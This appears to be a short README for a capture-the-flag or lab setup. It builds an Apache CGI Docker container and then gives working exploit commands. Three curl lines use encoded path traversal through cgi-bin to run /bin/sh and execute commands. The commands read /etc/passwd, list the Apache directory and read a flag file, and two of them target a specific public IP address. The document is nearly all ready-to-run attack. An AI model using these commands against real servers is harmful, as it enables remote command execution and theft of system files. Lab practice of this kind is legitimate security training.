## Run
```
docker build -t apache-cgi cgi_mod_enable .
docker run -dit --name apache-lab -p 9003:80 apache-cgi
```

## Exploit
```
curl http://103.147.32.214:9003/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'C|echo;cat /etc/passwd'
curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'C|echo;ls -la /usr/local/apache2/'
curl http://103.147.32.214:9003/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'C|echo;cat /usr/local/apache2/this_is_real_flag'
```